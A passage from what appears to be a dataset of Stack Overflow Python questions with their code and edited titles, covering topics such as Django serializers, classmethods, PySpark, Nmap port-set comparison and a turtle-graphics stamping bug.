data_type = models.SmallIntegerField(default =0,choices = DATAITEM_DATATYPE) ... class AssetModelSerializer(serializers.ModelSerializer): org = serializers.SlugRelatedField(queryset=Org.objects.all(), slug_field='name') class Meta: model = AssetModel fields = ('org', 'name', 'model_type',.. class DataitemSerializer(serializers.ModelSerializer): class Meta: model = Dataitem fields = ('mod', 'name','data_type'...)",Writable nested serializer in django-rest-framework?
Accessing __init__ vars in classmethod," I come from java background, so I am slightly confused here.Consider the code snippet below: This throws an error : iIf I comment out @classmethod, this will work fine.My understanding (which is incorrect m sure) :When I do a = A(), then all the variables(obj_var) created in __init__ can be accessed via this a when passed to any other classmethod of same class.Apparently this is not the case.Question(s)why am i not able to access __init__ vars in class_method when decorater @classmethod is mentioned in the method but on removing the decorater, it works fine?how python internally process this particular class upon compilation?is there any way i can use @classmethod and the __init__ vars in same method? <code>  class A(): def __init__(self, **kwargs): self.obj_var = ""I am obj var"" @classmethod def class_method(cls): print cls.obj_var # this line is in question here cls.cls_obj = ""I m class object"" return cls.cls_obj In [30]: a = A()In [31]: a.obj_varOut[31]: 'I am obj var'In [32]: a.class_method()---------------------------------------------------------------------------AttributeError Traceback (most recent call last)<ipython-input-32-3dcd9d512548> in <module>()----> 1 a.class_method()<ipython-input-29-9c0d341ad75f> in class_method(cls) 8 @classmethod 9 def class_method(cls):---> 10 print cls.obj_var 11 cls.cls_obj = ""I m class object"" 12 return cls.cls_objAttributeError: class A has no attribute 'obj_var'",Should this method be a classmethod and why can't it access vars?
Append to list in a dictionary after setdefault in python," I have the below code where I am trying to append a 1 to the hash of an element, on every occurence of it in input. Output: Expected Output: I am puzzled why None gets in on doing an append. Kindly explain what is happening.Note:On typing the else portion, <code>  def test(Ar): hash_table = {} for elem in Ar: if elem not in hash_table: hash_table.setdefault(elem,[]).append(1) else: hash_table[elem] = hash_table[elem].append(1) print(hash_table)Ar = (1,2,3,4,5,1,2)test(Ar) {1: None, 2: None, 3: [1], 4: [1], 5: [1]} {1: [1,1], 2: [1,1], 3: [1], 4: [1], 5: [1]} hash_table[elem] = hash_table[elem].append(1) # the append() was not suggested at all by the IDE. I forcibly put it, hoping things will work.",Append to list in a dictionary after setdefault
How can I hangle matrices of this huge a size?," I am performing topic detection with supervised learning. However, my matrices are very huge in size (202180 x 15000) and I am unable to fit them into the models I want. Most of the matrix consists of zeros. Only logistic regression works. Is there a way in which I can continue working with the same matrix but enable them to work with the models I want? Like can I create my matrices in a different way?Here is my code: Load Vocabulary Create Train Matrix Make test matrix Load Supervised Model <code>  import numpy as npimport subprocessfrom sklearn.linear_model import SGDClassifierfrom sklearn.linear_model import LogisticRegressionfrom sklearn import metricsdef run(command): output = subprocess.check_output(command, shell=True) return output f = open('/Users/win/Documents/wholedata/RightVo.txt','r') vocab_temp = f.read().split() f.close() col = len(vocab_temp) print(""Training column size:"") print(col) row = run('cat '+'/Users/win/Documents/wholedata/X_tr.txt'+"" | wc -l"").split()[0]print(""Training row size:"")print(row)matrix_tmp = np.zeros((int(row),col), dtype=np.int64)print(""Train Matrix size:"")print(matrix_tmp.size)label_tmp = np.zeros((int(row)), dtype=np.int64)f = open('/Users/win/Documents/wholedata/X_tr.txt','r')count = 0for line in f: line_tmp = line.split() #print(line_tmp) for word in line_tmp[0:]: if word not in vocab_temp: continue matrix_tmp[count][vocab_temp.index(word)] = 1 count = count + 1f.close()print(""Train matrix is:\n "")print(matrix_tmp)print(label_tmp)print(""Train Label size:"")print(len(label_tmp))f = open('/Users/win/Documents/wholedata/RightVo.txt','r')vocab_tmp = f.read().split()f.close()col = len(vocab_tmp)print(""Test column size:"")print(col) row = run('cat '+'/Users/win/Documents/wholedata/X_te.txt'+"" | wc -l"").split()[0]print(""Test row size:"")print(row)matrix_tmp_test = np.zeros((int(row),col), dtype=np.int64)print(""Test matrix size:"")print(matrix_tmp_test.size)label_tmp_test = np.zeros((int(row)), dtype=np.int64)f = open('/Users/win/Documents/wholedata/X_te.txt','r')count = 0for line in f: line_tmp = line.split() #print(line_tmp) for word in line_tmp[0:]: if word not in vocab_tmp: continue matrix_tmp_test[count][vocab_tmp.index(word)] = 1 count = count + 1f.close()print(""Test Matrix is: \n"")print(matrix_tmp_test)print(label_tmp_test)print(""Test Label Size:"")print(len(label_tmp_test))xtrain=[]with open(""/Users/win/Documents/wholedata/Y_te.txt"") as filer: for line in filer: xtrain.append(line.strip().split())xtrain= np.ravel(xtrain)label_tmp_test=xtrainytrain=[]with open(""/Users/win/Documents/wholedata/Y_tr.txt"") as filer: for line in filer: ytrain.append(line.strip().split())ytrain = np.ravel(ytrain)label_tmp=ytrain model = LogisticRegression()model = model.fit(matrix_tmp, label_tmp)#print(model)print(""Entered 1"")y_train_pred = model.predict(matrix_tmp_test)print(""Entered 2"")print(metrics.accuracy_score(label_tmp_test, y_train_pred))",How can I handle huge matrices?
How to make the first first row as the header when reading a file in PySpark and coverting it to Pandas Dataframe," I am reading a file in PySpark and forming the rdd of it. I then convert it to a normal dataframe and then to pandas dataframe. The issue that I am having is that there is header row in my input file and I want to make this as the header of dataframe columns as well but they are read in as an additional row and not as header. This is my current code: Now when I look at the df then the header row of text file becomes the first row of dataframe and there is additional header in df with 0,1,2... as header. How can I make the first row as header? <code>  def extract(line): return lineinput_file = sc.textFile('file1.txt').zipWithIndex().filter(lambda (line,rownum): rownum>=0).map(lambda (line, rownum): line)input_data = (input_file .map(lambda line: line.split("";"")) .filter(lambda line: len(line) >=0 ) .map(extract)) # Map to tuplesdf_normal = input_data.toDF()df= df_normal.toPandas()",How to make the first row as header when reading a file in PySpark and converting it to Pandas Dataframe
How to make the first first row as header when reading a file in PySpark and converting it to Pandas Dataframe," I am reading a file in PySpark and forming the rdd of it. I then convert it to a normal dataframe and then to pandas dataframe. The issue that I am having is that there is header row in my input file and I want to make this as the header of dataframe columns as well but they are read in as an additional row and not as header. This is my current code: Now when I look at the df then the header row of text file becomes the first row of dataframe and there is additional header in df with 0,1,2... as header. How can I make the first row as header? <code>  def extract(line): return lineinput_file = sc.textFile('file1.txt').zipWithIndex().filter(lambda (line,rownum): rownum>=0).map(lambda (line, rownum): line)input_data = (input_file .map(lambda line: line.split("";"")) .filter(lambda line: len(line) >=0 ) .map(extract)) # Map to tuplesdf_normal = input_data.toDF()df= df_normal.toPandas()",How to make the first row as header when reading a file in PySpark and converting it to Pandas Dataframe
How to remove duplicate dictionary based on selected keys from a list of dictionaries in python," I am new to Python and trying to learn it as much as possible. I am stuck with a silly problem where I want to remove certain dictionary items of a list based on selective key-value pairs. For ex, I have: And the output I want is removal of dictionaries based on two keys A and C values: <code>  l = [{'A':1, 'B':2, 'C':3, 'D':4}, {'A':5, 'B':6, 'C':7, 'D':8}, {'A':1, 'B':9, 'C':3, 'D':10}] l = [{'A':1, 'B':2, 'C':3, 'D':4}, {'A':5, 'B':6, 'C':7, 'D':8}]",How to remove duplicate dictionary based on selected keys from a list of dictionaries in Python?
Including JS in Django," I'm writing a Django app and while somewhat familiar with Django I'm pretty unfamiliar with JavaScript. I'm adding a few lines of JavaScript into one of my pages in order to include a map.The script simply encompasses initializing the map and then adding markers according to information saved in my database.Given that there is so little code, would it still be considered bad practice to leave the script in the HTML template and pass information from my database using {{info}}?If so, what method would you consider to be better? <code> ",Javascript variables in Django HTML templates
How to compare dictionaries and see what changed ?," I am having 3 dictionaries in my python code :self.new_port_dict = {} # Dictionary to store the new portsfrom curr_hostself.old_port_dict = {} # Dictionary to store the old ports from old_hostself.results_ports_dict = {} # Holds the result of changed/newly added portsThe script needs to compare what port changed, I am almost there just unable to present help me out : This gives a output as : As you can clearly see , I have the resulting changed dictionary as well. I want to just print : <code>  def comp_ports(self,filename): try: f = open(filename) self.prev_report = pickle.load(f) # NmapReport for s in self.prev_report.hosts: self.old_port_dict[s.address] = set() for x in s.get_open_ports(): self.old_port_dict[s.address].add(x) for s in self.report.hosts: self.new_port_dict[s.address] = set() for x in s.get_open_ports(): self.new_port_dict[s.address].add(x) print ""The following Host/ports were available in old scan : !!"" print `self.old_port_dict` print ""--------------------------------------------------------"" print ""The following Host/ports have been added in new scan: !!"" print `self.new_port_dict` for h in self.old_port_dict.keys(): self.results_ports_dict[h] = self.new_port_dict[h]- self.old_port_dict[h] print ""Result Change: for"",h ,""->"",self.results_ports_dict[h] except Exception as l: print l The following Host/ports were available in old scan : !!{'172.16.0.41': set([(80, 'tcp'), (666, 'tcp')]), '172.16.0.163': set([(80, 'tcp'), (22, 'tcp')])}--------------------------------------------------------The following Host/ports have been added in new scan: !!{'172.16.0.41': set([(80, 'tcp'), (22, 'tcp')]), '172.16.0.163': set([(80, 'tcp'), (22, 'tcp')])}Result Change: for 172.16.0.41 -> set([(22, 'tcp')]) From set([(80, 'tcp'), (666, 'tcp')])Result Change: for 172.16.0.163 -> set([]) From set([(80, 'tcp'), (22, 'tcp')]) For ""host_name"" , Port changed from ""port_id"" to ""new_port_id"" ex: For 172.16.0.41, Port changed from (666, 'tcp') to (22, 'tcp')",How to compare dictionaries and see what changed?
Python requests for login and dryscrape for scrape," I wanna get some data from site, which requires loggin in.I log in by requests Then I wanna get data from some JS page. Through requests it isn't possible, so I have to use dryscrape for this. Is it possible to pass cookies to visit() or I have to look for another solution? <code>  url = ""http://example.com""response = requests.get(url, {""email"":""a@gmail.com"", ""password"":""12345""})cookies = response.cookies import dryscrapeurl = ""http://example.com/js-page""sess = dryscrape.Session()sess.visit(url)",Python dryscrape scrape page with cookies
function which is simmilar to numpy diff," I was wondering if there exists a function, which would compute at the same time moving average and combine it with np.diff?If you have an array and you would compute a mean for a moving window (moving average) and compute the difference between that mean and next 1 element.Example: How would I implement it, so that time computation wouldn't be so long, since I would like to use it for an array of 26000 elements and higher m? <code>  a = [1, 3, 4, 5, 15, 14, 16, 13]b = np.diff(a)#np.diff makes something like this: `[n] - [n-1]`#I want something like this: `[n] - np.mean([n-m : n])`#I would like to have a function, where I could vary `m`:m = 2d = [2, 1.5, 10.5, 4, 1.5, -2]",Function which is similar to numpy's diff
Determining maximum valid `setrecursionlimit` value for Python," In the Python 2 documentation, the sys library contains the following (bolded part is my edit):sys.setrecursionlimit(limit)Set the maximum depth of the Python interpreter stack to limit. This limit prevents infinite recursion from causing an overflow of the C stack and crashing Python.The highest possible limit is platform-dependent. A user may need to set the limit higher when she has a program that requires deep recursion and a platform that supports a higher limit. This should be done with care, because a too-high limit can lead to a crash.What does this mean? Is this just a general ""make sure you have enough memory to handle the extra stack space"" statement, or is there a specific ""per stack frame"" size that can be used to calculate the memory value required? What happens to Python when it can't acquire the space? <code> ",Determining maximum valid setrecursionlimit value for Python
Python turtle stamp disappearing after turtle shape's image manipulation," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 9.18 for Windows found and utilized"")elif her == 'darwin': print(""Macintosh is your Operating System"") if shutil.which(""gs"") is None: os.environ[""PATH""] += "":/usr/local/bin"" if shutil.which(""gs"") is None: print(""You do not have GhostScript installed for Macintosh. Please install it."") sys.exit(0) else: print(""GhostScript for Macintosh found and utilized"")from turtle import *from tkinter import *try: import tkinter.filedialog as filedialogexcept ImportError: passimport collectionsfrom PIL import Image, ImageEnhance, ImageOpsjiop = collections.deque()pictures = collections.deque()edited = collections.deque()picwidth = collections.deque()picheight = collections.deque()def draw_space(): # Draw a space 200 pixels wide. penup() forward(200) pendown()def TurtleShape(): try: manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) rotateButton.config(state = NORMAL) global klob klob = filedialog.askopenfilename() global im im = Image.open(klob) pictures.append(im) edited.clear() im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except AttributeError: passdef TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 width = im.size[0] height = im.size[1] NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) Picwidth = NewOne2 if NewOne2 != None else width picwidth.append(Picwidth) Picheight = NewOne if NewOne != None else height picheight.append(Picheight) try: try: hye = jiop.pop() jiop.append(hye) except: hye = edited.pop() jiop.append(hye) editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) pictures.append(editpic) except: geer = pictures.pop() editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update()def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: jiop.clear() ghy = edited.pop() kpl = ImageOps.flip(ghy) edited.append(kpl) pictures.append(kpl) print(""Jlop"") except: neer = pictures.pop() kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() fgrt = ImageOps.mirror(jui) edited.append(fgrt) pictures.append(fgrt) except: bbc = pictures.pop() fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) pictures.append(fetch) except: bolt = pictures.pop() fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update()def StampPic(): stamp() draw_space() update()def move_turtle(): # Pick up the turtle and move it to its starting location. penup() goto(-200, 100) pendown()def settings(): # Tkinter buttons turtlepic = Button(text = ""Set Turtle Image"", command = TurtleShape) turtlepic.pack(side = 'left') stampimage = Button(text = ""Stamp"", command = StampPic) stampimage.pack(side = 'left') global manipulateimage manipulateimage = Button(text = ""Resize Turtle Image"", command = TurtleImageResize, state = DISABLED) manipulateimage.pack(side = 'left') global flipButton flipButton = Button(text = ""Flip image"", command = flippic, state = DISABLED) flipButton.pack(side = 'left') global mirrorButton mirrorButton = Button(text = ""Mirror Image"", command = mirror, state = DISABLED) mirrorButton.pack(side = 'left') global rotateButton rotateButton = Button(text = ""Rotate Image"", command = rotatePic, state = DISABLED) rotateButton.pack(side = 'left')def skip(x, y): penup() goto(x, y) pendown() update()move_turtle()settings()speed(0)tracer(0, 0)onscreenclick(skip)if sys.platform == 'win32': input()else: pass",Python turtle stamp mysteriously disappears after turtle shape's image manipulation
"Python turtle stamp disappearing after turtle ""shape's"" manipulation"," Orientation:I have created the following functions to allow the user to change the turtle to an image of the his/her choosing and then stamp it to the canvas at any point: The image can also be manipulated to the user's choosing by these other functions:Resize function This function works either as a first or secondary function. First meaning that it is called initially, and secondary meaning it edits an already edited image. So, if ONLY called first, this function will take the image appended to the pictures deque, resize that, and output the edited image as a .gif image, which will be the new shape of the turtle. However, if called two times or more in a row, because of an issue where resizing the same picture more than once will result in a distorted image, I had to create another deque jiop which saves the original item from the pictures deque, and whenever this function is called more than once in a row, that original image is resized every time, instead of the same image each time. But, if ONLY called as a secondary function, then the function will simply take the current image from the edited deque, resize that image, and then set that as the turtle's new shape: Flip, Rotate, and Mirror functions - These work rather simpler than the resize function above. If called initially, they each will take the image from the pictures deque, manipulate it, append that edited image to the edited deque, then change the turtle ""shape"" to that new image. However, if called second, they each will take the image from the edited deque, manipulate that, re-append the manipulated image back to the edited deque, then set that as the turtle's new ""shape"". These functions are shown below: This way ALL the editing functions work together on essentially the same fundamental image. The Issue:Now, consider that the user wants to take the turtle image and then resize it to the size, for instance, 800x400, and stamp it to a specific spot on the canvas. After that, the user decides to move the turtle image to another spot on the canvas, flip the image, and then stamp the image there. There should now be two images right? One stamped, and the other flipped? However, with my program, for some reason, that is not the case. Instead, the stamped image disappears the moment the user flips the turtle image, even though there is no clear() function to be found anywhere (to show you what I mean, refer to the edit below). Apparently this issue ONLY occurs after the TurtleImageResize function is called.What is wrong in my TurtleImageResize function that is leading to this issue? I had completely revamped the turtle shape's image management process to what it is right now in hopes that it will fix this issue that I was also experiencing with my previous setup, but apparently, that is STILL not the case. Therefore, any help with this issue is greatly appreciated!EDIT: Below is a minimal, complete, and verifiable way to reproduce the issue I am having (MUST have PIL (or Pillow) and GhostScript installed in order for this to work): When/if you have both GhostScript and PIL (or Pillow) installed on your system, to reproduce my issue, please do the following (All steps required except step # 4):Click the Set Turtle Image button at bottom of window, select any image you want the turtle to be, then press Open. The turtle gets set to that image.Resize the Image to 800x400 (or any other size you want) by pressing the Resize turtle Image button at the bottom of the screen. Two dialogs will pop up in succession. Enter the width of 800 (or your own width) in the first dialog, and then enter the height of 400 (or your own height) in the second dialog, and after you finish, the image will change size according to the dimensions provided (or set image back to the original dimension(s) depending on whether or not you pressed cancel).Select the Stamp button at the bottom of the window. The image is stamped onto the canvas, and the turtle moves forward 400 pixels ""behind"" the stamped image.OPTIONAL: Click anywhere on the canvas to take the turtle to that spot.Flip/mirror/rotate the image.As you can see, after doing all this, just as you flip/mirror/rotate the image, the stamped image just disappears. What is wrong with my TurtleImageResize function that is causing this to occur?EDIT # 2: Just in case this information is useful, I am running Python 3.5.1 on a Macintosh with OS version 10.11.2 (El Capitan). <code>  def TurtleShape(): try: # Tkinter buttons related to turtle manipulation manipulateimage.config(state = NORMAL) flipButton.config(state = NORMAL) mirrorButton.config(state = NORMAL) originalButton.config(state = NORMAL) resetturtle.config(state = NORMAL) rotateButton.config(state = NORMAL) # Ask user for file name from tkinter file dialog, and return file name as `klob` global klob klob = filedialog.askopenfilename() global im # Open `klob` and return as `im` im = Image.open(klob) # Append `im` to pictures deque pictures.append(im) # Clear `edited` deque edited.clear() # Save `im` as an image, then register image as shape, and finally set image as turtle shape im.save(klob + '.gif', ""GIF"") register_shape(klob + '.gif') shape(klob + '.gif') update() except: # If user selects cancel in file dialog, then pass passdef StampPic(): stamp() draw_space() # Go forward 100 pixels with pen up after every stamp update() def TurtleImageResize(): if not hasattr(TurtleImageResize, ""counter""): TurtleImageResize.counter = 0 TurtleImageResize.counter += 1 # width = original size of image width = im.size[0] # height = original height of image height = im.size[1] # Allow user to enter new width for image NewOne2 = numinput('Width of Image', 'Set the width of the image: ', minval = 1) # Allow user to enter new height for image NewOne = numinput('Height of Image', 'Set the height of your image: ', minval = 1) # Set width to user input if user input is NOT nothing. Otherwise, use `width` as picture width. Picwidth = NewOne2 if NewOne2 != None else width # Set height to user input if user input is NOT None. Otherwise, use `height` as picture height. Picheight = NewOne if NewOne != None else height try: # Secondary Step: Take ORIGINAL image appended to `jiop` (from `except:` code block succeeding `try:` code block) and resize THAT image each time this function is called twice in a row. Otherwise, if ONLY called as a secondary step, take previously edited image from `edited` deque, resize that, and append newly edited image to the `edited` deque. try: # `jiop` is a deque hye = jiop.pop() jiop.append(hye) print(""Jiop"") except: hye = edited.pop() jiop.append(hye) print(""Edited"") # Resize Image to Picwidth and Picheight editpic = hye.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) edited.append(editpic) print(""Hooplah!"") except: # Intial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` geer = pictures.pop() # Resize Image to Picwidth and Picheight editpic = geer.resize((int(Picwidth), int(Picheight)), Image.ANTIALIAS) jiop.append(geer) edited.append(editpic) pictures.append(editpic) print(""Normal"") # Save image as `.gif` editpic.save(klob + str(TurtleImageResize.counter) + '.gif', 'GIF') # Register image as a shape, and use it as shape of turtle register_shape(klob + str(TurtleImageResize.counter) + '.gif') shape(klob + str(TurtleImageResize.counter) + '.gif') update() def flippic(): if not hasattr(flippic, ""counter""): flippic.counter = 0 flippic.counter += 1 try: # Secondary step: Take previously edited image from `edited` deque, manipulate that, and append newly edited image to the `edited` deque jiop.clear() ghy = edited.pop() # Flip image over horizontal line kpl = ImageOps.flip(ghy) edited.append(kpl) print(""Jlop"") except: # Initial step: Take image appended to `pictures` deque from `TurtleShape` function, then edit that and append newly edited image to both `editpic` and `pictures` neer = pictures.pop() # Flip image over horizontal line kpl = ImageOps.flip(neer) pictures.append(kpl) edited.append(kpl) print(""Yup"") # Save image as `.gif` kpl.save(klob + str(flippic.counter) + '.gif', ""GIF"") # Register image as a shape, and use it as shape of turtle register_shape(klob + str(flippic.counter) + '.gif') shape(klob + str(flippic.counter) + '.gif') update()def mirror(): if not hasattr(mirror, ""counter""): mirror.counter = 0 mirror.counter += 1 try: jiop.clear() jui = edited.pop() # Flip image over vertical line fgrt = ImageOps.mirror(jui) edited.append(fgrt) except: bbc = pictures.pop() # Flip image over vertical line fgrt = ImageOps.mirror(bbc) pictures.append(fgrt) edited.append(fgrt) fgrt.save(klob + str(mirror.counter) + "".gif"") register_shape(klob + str(mirror.counter) + "".gif"") shape(klob + str(mirror.counter) + "".gif"") update()def rotatePic(): if not hasattr(rotatePic, ""counter""): rotatePic.counter = 0 rotatePic.counter += 1 try: jiop.clear() lmcb = edited.pop() # Rotate image 90 right fetch = lmcb.rotate(-90, expand = True) edited.append(fetch) except: bolt = pictures.pop() # Rotate image 90 right fetch = bolt.rotate(-90, expand = True) pictures.append(fetch) edited.append(fetch) fetch.save(klob + str(rotatePic.counter) + "".gif"") register_shape(klob + str(rotatePic.counter) + "".gif"") shape(klob + str(rotatePic.counter) + "".gif"") update() import os,shutil,subprocess, sysher = sys.platformif her == ""win32"": print(""Windows is your Operating System"") win_gs = [""gs"",""gswin32c"",""gswin64c""] if all( shutil.which(gs_version) is None for gs_version in win_gs ): paths = [""C:\\Program Files\\gs\\gs9.18\\bin"",""C:\\Program Files (x86)\\gs\\gs9.18\\bin""] for path in (x for x in paths if os.path.exists(x)): os.environ[""PATH""] += "";"" + path break if any( shutil.which(gs_version) for gs_version in win_gs ): print(""GhostScript 9.18 for Windows found and utilized"") else: print(""You do not have GhostScript 9.18 installed for Windows. Please install it."") sys.exit(0) else: print(""GhostScript 